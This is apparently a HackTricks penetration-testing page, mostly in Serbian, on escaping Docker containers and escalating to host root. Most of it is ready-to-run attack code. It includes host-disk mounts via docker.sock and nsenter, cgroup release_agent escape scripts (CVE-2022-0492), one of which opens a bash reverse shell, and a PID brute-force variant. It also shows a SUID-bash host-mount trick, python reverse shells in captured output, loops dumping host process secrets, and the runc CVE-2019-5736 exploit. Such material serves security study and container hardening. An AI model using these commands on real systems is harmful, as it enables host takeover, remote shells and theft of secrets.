# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Automatska Enumeracija & Bekstvo

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Takođe može **enumerisati kontejnere**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Ovaj alat je prilično **koristan za enumeraciju kontejnera u kojem se nalazite, čak i za automatsko bekstvo**
- [**amicontained**](https://github.com/genuinetools/amicontained): Koristan alat za dobijanje privilegija koje kontejner ima kako bi se pronašli načini za bekstvo iz njega
- [**deepce**](https://github.com/stealthcopter/deepce): Alat za enumeraciju i bekstvo iz kontejnera
- [**grype**](https://github.com/anchore/grype): Dobijte CVE-ove sadržane u softveru instaliranom u slici

## Bekstvo iz Montiranog Docker Soka

Ako nekako otkrijete da je **docker sok montiran** unutar docker kontejnera, moći ćete da pobegnete iz njega.\
To se obično dešava u docker kontejnerima koji iz nekog razloga moraju da se povežu sa docker demon da bi izvršili radnje.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
U ovom slučaju možete koristiti obične docker komande za komunikaciju sa docker demonima:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> U slučaju da je **docker socket na neočekivanom mestu**, i dalje možete komunicirati s njim koristeći **`docker`** komandu sa parametrima **`-H unix:///path/to/docker.sock`**

Docker daemon može takođe [slušati na portu (po defaultu 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na sistemima zasnovanim na Systemd, komunikacija sa Docker daemon-om može se odvijati preko Systemd socket-a `fd://`.

> [!NOTE]
> Pored toga, obratite pažnju na runtime socket-e drugih visoko-nivo runtima:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Zloupotreba Kapaciteta

Trebalo bi da proverite kapacitete kontejnera, ako ima neki od sledećih, možda ćete moći da pobegnete iz njega: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Možete proveriti trenutne kapacitete kontejnera koristeći **prethodno pomenute automatske alate** ili:
```bash
capsh --print
```
Na sledećoj stranici možete **saznati više o linux sposobnostima** i kako ih zloupotrebiti za bekstvo/escalaciju privilegija:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Bekstvo iz privilegovanih kontejnera

Privilegovan kontejner može biti kreiran sa oznakom `--privileged` ili onemogućavanjem specifičnih odbrana:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Oznaka `--privileged` značajno smanjuje bezbednost kontejnera, nudeći **neograničen pristup uređajima** i zaobilazeći **nekoliko zaštita**. Za detaljno objašnjenje, pogledajte dokumentaciju o punim uticajima `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Privilegovan + hostPID

Sa ovim dozvolama možete jednostavno **preći u prostor imena procesa koji se izvršava na hostu kao root** poput init (pid:1) jednostavno pokretanjem: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testirajte to u kontejneru izvršavajući:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

Samo sa privilegovanom oznakom možete pokušati da **pristupite disku hosta** ili pokušate da **pobegnete zloupotrebom release_agent ili drugih izlaza**.

Testirajte sledeće zaobilaženja u kontejneru izvršavajući:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montiranje diska - Poc1

Dobro konfigurisani docker kontejneri neće dozvoliti komandu kao što je **fdisk -l**. Međutim, na loše konfigurisanoj docker komandi gde je postavljena zastavica `--privileged` ili `--device=/dev/sda1` sa velikim slovima, moguće je dobiti privilegije da se vide host diskovi.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Dakle, da preuzmete host mašinu, to je trivijalno:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
I evo! Sada možete pristupiti datotečnom sistemu domaćina jer je montiran u `/mnt/hola` folderu.

#### Montiranje diska - Poc2

Unutar kontejnera, napadač može pokušati da dobije dalji pristup osnovnom host OS-u putem zapisivog hostPath volumena koji je kreirao klaster. Ispod su neke uobičajene stvari koje možete proveriti unutar kontejnera da vidite da li možete iskoristiti ovaj napadački vektor:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privileged Escape Zloupotreba postojećeg release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privileged Escape Zloupotreba kreiranog release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Pronađite **objašnjenje tehnike** u:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Privileged Escape Zloupotreba release_agent bez poznavanja relativne putanje - PoC3

U prethodnim eksploatacijama **apsolutna putanja kontejnera unutar datotečnog sistema domaćina je otkrivena**. Međutim, to nije uvek slučaj. U slučajevima kada **ne znate apsolutnu putanju kontejnera unutar domaćina** možete koristiti ovu tehniku:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Izvršavanje PoC unutar privilegovanog kontejnera trebalo bi da pruži izlaz sličan:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Eskalacija privilegija zloupotrebom osetljivih montiranja

Postoji nekoliko fajlova koji mogu biti montirani i koji daju **informacije o osnovnom hostu**. Neki od njih mogu čak ukazivati na **nešto što će host izvršiti kada se nešto dogodi** (što će omogućiti napadaču da pobegne iz kontejnera).\
Zloupotreba ovih fajlova može omogućiti:

- release_agent (već pokriveno ranije)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Međutim, možete pronaći **druge osetljive fajlove** koje treba proveriti na ovoj stranici:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbitrarna montiranja

U nekoliko slučajeva ćete primetiti da **kontejner ima neki volumen montiran sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Čitajte tajne, menjajte ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Eskalacija privilegija sa 2 shell-a i host mount-om

Ako imate pristup kao **root unutar kontejnera** koji ima neku fasciklu sa hosta montiranu i imate **pobeđeno kao neprivilegovan korisnik na hostu** i imate pristup za čitanje nad montiranom fasciklom.\
Možete kreirati **bash suid fajl** u **montiranoj fascikli** unutar **kontejnera** i **izvršiti ga sa hosta** da biste eskalirali privilegije.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

Ako imate pristup kao **root unutar kontejnera** i ste **pobegli kao korisnik bez privilegija na host**, možete zloupotrebiti oba shell-a da **privesc unutar host-a** ako imate mogućnost MKNOD unutar kontejnera (to je podrazumevano) kao [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Sa takvom mogućnošću, root korisnik unutar kontejnera može **kreirati blok uređajske datoteke**. Uređajske datoteke su posebne datoteke koje se koriste za **pristup osnovnom hardveru i kernel modulima**. Na primer, /dev/sda blok uređajska datoteka omogućava pristup da **pročitate sirove podatke na sistemskom disku**.

Docker štiti od zloupotrebe blok uređaja unutar kontejnera primenjujući cgroup politiku koja **blokira operacije čitanja/pisanja blok uređaja**. Ipak, ako je blok uređaj **kreiran unutar kontejnera**, postaje dostupan spolja iz kontejnera putem **/proc/PID/root/** direktorijuma. Ovaj pristup zahteva da **vlasnik procesa bude isti** i unutar i izvan kontejnera.

**Exploitation** primer iz ovog [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Ako možete pristupiti procesima hosta, moći ćete da pristupite velikoj količini osetljivih informacija koje se čuvaju u tim procesima. Pokrenite test laboratoriju:
```
docker run --rm -it --pid=host ubuntu bash
```
Na primer, moći ćete da nabrojite procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.

Zatim, pošto možete **pristupiti svakom procesu hosta u /proc/ možete jednostavno ukrasti njihove env tajne** pokretanjem:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Možete takođe **pristupiti datotečnim deskriptorima drugih procesa i čitati njihove otvorene datoteke**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Možete takođe **ubiti procese i izazvati DoS**.

> [!WARNING]
> Ako nekako imate privilegovani **pristup procesu van kontejnera**, mogli biste pokrenuti nešto poput `nsenter --target <pid> --all` ili `nsenter --target <pid> --mount --net --pid --cgroup` da **pokrenete shell sa istim ns ograničenjima** (nadamo se bez ograničenja) **kao taj proces.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Ako je kontejner konfigurisan sa Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), mrežni stek tog kontejnera nije izolovan od Docker hosta (kontejner deli mrežni prostor hosta), i kontejner ne dobija svoju IP adresu. Drugim rečima, **kontejner vezuje sve usluge direktno za IP hosta**. Pored toga, kontejner može **presresti SVE mrežne pakete koje host** šalje i prima na deljenom interfejsu `tcpdump -i eth0`.

Na primer, možete koristiti ovo da **snifujete i čak spoof-ujete saobraćaj** između hosta i instanci metapodataka.

Kao u sledećim primerima:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Takođe ćete moći da pristupite **mrežnim uslugama vezanim za localhost** unutar hosta ili čak da pristupite **dozvolama metapodataka čvora** (koje se mogu razlikovati od onih kojima kontejner može pristupiti).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) hosta, kao što je **deljena memorija** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih host ili pod procesa. Koristite `ipcs` za dalju inspekciju ovih IPC mehanizama.

- **Inspekcija /dev/shm** - Potražite bilo koje datoteke u ovoj lokaciji deljene memorije: `ls -la /dev/shm`
- **Inspekcija postojećih IPC objekata** – Možete proveriti da li se koriste neki IPC objekti sa `/usr/bin/ipcs`. Proverite sa: `ipcs -a`

### Oporavak sposobnosti

Ako sistemski poziv **`unshare`** nije zabranjen, možete povratiti sve sposobnosti pokretanjem:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Zloupotreba korisničkog imenskog prostora putem symlink-a

Druga tehnika objašnjena u postu [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) ukazuje na to kako možete zloupotrebiti bind mount-ove sa korisničkim imenskim prostorima, da utičete na datoteke unutar hosta (u tom specifičnom slučaju, da obrišete datoteke).

## CVE-ovi

### Runc exploit (CVE-2019-5736)

U slučaju da možete izvršiti `docker exec` kao root (verovatno sa sudo), pokušajte da eskalirate privilegije bežeći iz kontejnera zloupotrebljavajući CVE-2019-5736 (eksploit [ovde](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ova tehnika će u suštini **prepisati** _**/bin/sh**_ binarni fajl **hosta** **iz kontejnera**, tako da svako ko izvršava docker exec može aktivirati payload.

Promenite payload u skladu sa tim i izgradite main.go sa `go build main.go`. Rezultantni binarni fajl treba da bude smešten u docker kontejner za izvršavanje.\
Po izvršavanju, čim prikaže `[+] Overwritten /bin/sh successfully` potrebno je izvršiti sledeće sa host mašine:

`docker exec -it <container-name> /bin/sh`

Ovo će aktivirati payload koji je prisutan u main.go datoteci.

Za više informacija: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Postoje i drugi CVE-ovi na koje kontejner može biti ranjiv, možete pronaći listu na [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Prilagođena Eskapada

### Površina za Eskapadu Docker-a

- **Imenski prostori:** Proces bi trebao biti **potpuno odvojen od drugih procesa** putem imenskih prostora, tako da ne možemo pobjeći interagujući sa drugim procesima zbog imenskih prostora (po defaultu ne mogu komunicirati putem IPC-a, unix soketa, mrežnih usluga, D-Bus-a, `/proc` drugih procesa).
- **Root korisnik**: Po defaultu, korisnik koji pokreće proces je root korisnik (međutim, njegove privilegije su ograničene).
- **Kapaciteti**: Docker ostavlja sledeće kapacitete: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Ovo su syscalls koje **root korisnik neće moći da pozove** (zbog nedostatka kapaciteta + Seccomp). Ostali syscalls bi mogli biti korišćeni da pokušaju da pobegnu.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
